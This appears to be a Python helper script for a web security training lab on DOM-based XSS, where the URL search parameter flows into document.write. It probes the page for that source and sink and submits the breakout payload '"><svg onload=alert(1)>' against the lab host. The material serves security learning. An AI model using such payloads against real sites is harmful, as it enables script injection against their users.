# Lab: DOM XSS in document.write sink using source location.search
 
import requests
 
 
base = "https://0a5800df030eb49c807c210400610079.web-security-academy.net"
s = requests.Session()
PAYLOAD = '"><svg onload=alert(1)>'   # single quotes outside -> no backslash needed
 
print("===========[step1] Check source/sink on the search page===============")
r = s.get(base, params={"search": "abc123"})
print(r.text)
'''
                   <script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>
'''
print("source(location.search):", "location.search" in r.text)
print("sink(document.write):", "document.write" in r.text)

 
print("===========[step2] Check if the payload is reflected in the server response===============")
r = s.get(base, params={"search": PAYLOAD})
print("status:", r.status_code)
print("payload in server response:", PAYLOAD in r.text)
# False is expected: the browser's JS inserts it, not the server = DOM XSS
# requests does not run JS, so this script cannot solve the lab. Solve it in the browser.
 